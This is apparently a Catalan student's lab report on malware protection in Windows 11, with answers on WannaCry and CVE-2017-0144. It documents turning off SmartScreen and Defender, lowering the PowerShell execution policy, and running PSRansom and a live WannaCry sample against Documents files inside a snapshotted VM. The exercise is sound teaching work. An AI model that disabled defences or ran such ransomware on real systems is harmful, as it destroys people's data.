## T08: Seguretat: protegint-nos contra el malware
---
## Abdeslam Khfif Koubee

---

![imatge](/Tasca08/IMG/1.png.png)

El primer que haurem de fer sera entrar al microsoft edge i buscar eicar al buscador i instalem el .zip i veurem que no ens deixa instalar-ho

---

![imatge](/Tasca08/IMG/2.png.png)

En el edge li tindrem que doonar els tres punts de adalt a la dreta i anirem a configuració, despres entrarem a "privacidad, busqueda y servicios"

---

![imatge](/Tasca08/IMG/3.png.png)

Ara que ja estem a dins on indica la fletxa la tindrem que desactivar ja que per defecte be activada 

---

![imatge](/Tasca08/IMG/4.png.png)

Aqui ja la hauriem desactivat


---

![imatge](/Tasca08/IMG/5.png.png)

Ara entrarem a "seguridad de windows" i al entrar anirem al apartat de "protección antivirus y contra amenazas"

---

![imatge](/Tasca08/IMG/6.png.png)

I aqui tindrem que desactivar les dues primeres opcions 

---

![imatge](/Tasca08/IMG/7.png.png)

Ara tornarem a entrar a eicar i instalarem 3 arxius .zip i veurem que ara ens deixa instalar-ho 


---

![imatge](/Tasca08/IMG/8.png.png)

Despres anirem a instalar el WinRAR

---

![imatge](/Tasca08/IMG/9.png.png)

Aqui li donarem a instalar perque s'instali correctament

---


# SISTEMES DE PROTECCIÓ DE WINDOWS 11

## Quines proteccions incorporar Windows 11 a la seccció de "Protección antivirus y contra amenazas"? 
Inclou Microsoft Defender Antivirus, protecció en temps real, protecció basada en el núvol, protecció contra manipulacions i opcions d’anàlisi del sistema.

## Quines opcions tenim a "Control de aplicaciones y navegador"?
Ofereix SmartScreen per bloquejar webs i programes perillosos, protecció basada en la reputació de les aplicacions, control de descarregues i millores de seguretat per al navegador Microsoft Edge.


## Investigueu quines opcions específiques hi ha per la protecció contra ransomware a Windows 11. 
Inclou l’accés controlat a carpetes per evitar canvis no autoritzats, el bloqueig d’aplicacions sospitoses, la protecció dels fitxers personals i la possibilitat de fer còpies de seguretat amb OneDrive.


----

![imatge](/Tasca08/IMG/10.png.png)

Ara entrarem a documents i afagirem 3 documents .txt

---

![imatge](/Tasca08/IMG/11.png.png)

Ara entrarem al github per poder descarregar el "PSRansom.ps1"

---

![imatge](/Tasca08/IMG/12.png.png)

Ara entrarem al powershell i posem la comanda "set-ExecutionPolicy -ExecutionPolicy unrestricted" i ficarem una o per fer un si a todo 

---

![imatge](/Tasca08/IMG/13.png.png)

Just despres farem primer un cd C:\Users\Abdes\downloads i despres un " .\PSRansom.ps1 -e C:\Users\Abdes\documents -s 127.0.0.1 -p 80 -x"

---

![imatge](/Tasca08/IMG/14.png.png)

I al tronar a documents veurem que els documents que hem creat abans estaran amb format .psr

---

![imatge](/Tasca08/IMG/15.png.png)

Ara farem un " .\PSRansom.ps1 -d C:\Users\Abdes\documents -k IpnXV0ilg0bF8TrdiaJHL7Nh" amb el codig que ens ha donat el readme de abans


---


![imatge](/Tasca08/IMG/16.png.png)

Ara tornem a entrar a documents i veiem que els nostres documents no estan xifrats despres de posar la nostre clau 

---

ATACS DE RANSOMWARE: WANNACRY 

1- Expliqueu quins són els factors que fan que WannaCry es propagui tan ràpid. Expliqueu què vol dir. 

WannaCry es va propagar molt ràpid perquè actua com un cuc: es copia automàticament d’un ordinador a un altre sense que l’usuari faci res. Aprofita sistemes Windows sense actualitzar i es mou per la xarxa explotant aquesta debilitat, cosa que permet infectar molts equips en molt poc temps.

2- Quina vulnerabilitat en concret es fa servir? Busqueu el CVE associat. És molt greu? 

La vulnerabilitat utilitzada és CVE-2017-0144, relacionada amb el protocol SMBv1 de Windows (exploit EternalBlue). És una vulnerabilitat crítica, ja que permet executar codi de manera remota sense permisos de l’usuari.

3- S'ha de pagar el rescat demanat? Per què? Busqueu per internet a veure si trobeu alguna empresa negociadora de rescats i com funciona. Això s'està fent, tot i que no se sol recomanar...

No es recomana pagar el rescat perquè no assegura la recuperació de les dades i finança el cibercrim. Existeixen empreses que negocien amb els atacants en casos extrems, analitzant l’atac i actuant com a intermediàries, tot i que aquesta pràctica no és aconsellable.

4- Quines mesures podem aplicar si volem PREVENIR un atac de Ransomware abans que passi?

Per prevenir ransomware cal mantenir els sistemes actualitzats, fer còpies de seguretat periòdiques, utilitzar antivirus, desactivar SMBv1, limitar permisos i formar els usuaris.

 5- Quines mesures aplicarem si JA HEM SOFERT un atac de WannaCry i no hem aplicat les mesures de prevenció o ho hem fet parcialment?

Si ja s’ha patit un atac, cal aïllar els equips infectats, no pagar el rescat, restaurar les dades des de còpies de seguretat, aplicar els pegats de seguretat i revisar la protecció del sistema.


---

![imatge](/Tasca08/IMG/17.png.png)

Ara a dins de la maquina anirem a les opcions de adalt i li donarem click a la que diu "Màquina" i li donarem a "fes una instantània"


---


![imatge](/Tasca08/IMG/18.png.png)

A la instantània li ficarem de nom "abans del virus"


---


![imatge](/Tasca08/IMG/19.png.png)

A dins de documents ficarem diferents tipus de arxius format .txt alguna imatge png i algun pdf, i una carpeta amb format zip, despres seleccionarem tots els fitxers creats i entrarem a winRAR i crearem un que ens demani contrasenya 


---


![imatge](/Tasca08/IMG/20.png.png)

Ara que les tenim creades estaran els fitxers a dins de les carpetes


---


![imatge](/Tasca08/IMG/21.png.png)

Aqui a la carpeta sense conttrasenya podem veure que si podem accedir 


---


![imatge](/Tasca08/IMG/22.png.png)

Aqui veiem que a la carpeta amb contrasenya no podem accedir


---

![imatge](/Tasca08/IMG/23.png.png)

Ara entrarem al github per descarregar-nos el Wannacry


---


![imatge](/Tasca08/IMG/24.png.png)

Al entrar a la carpeta ens demanara ficar una contrasenya en el nostre cas la contrasenya sera infected 

---

![imatge](/Tasca08/IMG/25.png.png)

Despres de ficar la contrasenya ens surt una arxiu malintencionat de wannacry i li donarem a executarlo igualment


---


![imatge](/Tasca08/IMG/26.png.png)

Aqui ens surt un missatge de seguridad de windows sobre el ransome trobat 


---


![imatge](/Tasca08/IMG/27.png.png)

Ara entrem a documents i veiem que tots els arxius estan infectats 


---


![imatge](/Tasca08/IMG/28.png.png)

Ara entrarem al microsoft edge i buscarem virus total 


---


![imatge](/Tasca08/IMG/29.png.png)

I triarem el arxiu sense contrasenya 


---


![imatge](/Tasca08/IMG/30.png.png)

Aqui veiem que tot esta correcta 


---


![imatge](/Tasca08/IMG/31.png.png)

Ara buscarem openKaspersky i afegirem un arxiu 


---

![imatge](/Tasca08/IMG/32.png.png)

Tronarem a posar el arxiu sense contrasenya   


---


![imatge](/Tasca08/IMG/33.png.png)

Ara anirem a treure la xarxa de la nostre maquina virtual


---


![imatge](/Tasca08/IMG/34.png.png)

Ara executarem el wannacry


---

![imatge](/Tasca08/IMG/35.png.png)

Ens trona a sortir el missatge de seguridad de windows del ransomware


---


![imatge](/Tasca08/IMG/36.png.png)

Aqui veiem que quan obrim el nostre arxiu en sortira xirat 


---

![imatge](/Tasca08/IMG/37.png.png)

Ara apaguarem la maquina i entrar a la maquina de abans del virus ja tot tronara a la normalitat 

---


